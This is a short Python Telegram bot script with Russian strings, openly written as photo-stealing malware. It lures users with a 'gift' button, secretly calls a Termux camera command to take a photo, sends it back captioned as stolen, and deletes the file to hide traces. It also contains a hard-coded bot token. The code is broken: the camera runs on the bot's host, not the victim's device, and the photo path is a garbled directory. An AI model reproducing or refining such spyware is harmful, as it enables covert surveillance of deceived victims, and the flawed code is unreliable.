import os
import subprocess
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext

TOKEN = "7510733548:AAGp3Q_-vvQzT2eHUg_iBh2EsxZuhSFlzXw"
PHOTO_PATH = "storage/0/emulated/Download/Telegram/"

def start(update: Update, context: CallbackContext) -> None:
    malware_url = f"https://t.me/{context.bot.username}?start=face_capture"
    keyboard = [[InlineKeyboardButton("🔥 НАЖМИ ДЛЯ МАГИИ", url=malware_url)]]
    update.message.reply_text(
        "🎁 Получите свой подарок:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

def execute_photo_theft(update: Update, context: CallbackContext) -> None:
    try:
        # Тайный вызов Termux API для доступа к камере
        subprocess.run(["termux-camera-photo", "-c", "0", PHOTO_PATH])
        with open(PHOTO_PATH, "rb") as photo:
            update.message.reply_photo(photo, caption="✅ Ваше фото успешно украдено")
        os.remove(PHOTO_PATH)  # Уничтожение следов
    except Exception as e:
        update.message.reply_text(f"🚨 Ошибка кражи: {str(e)}")

def main() -> None:
    updater = Updater(TOKEN)
    dispatcher = updater.dispatcher
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("face_capture", execute_photo_theft))
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
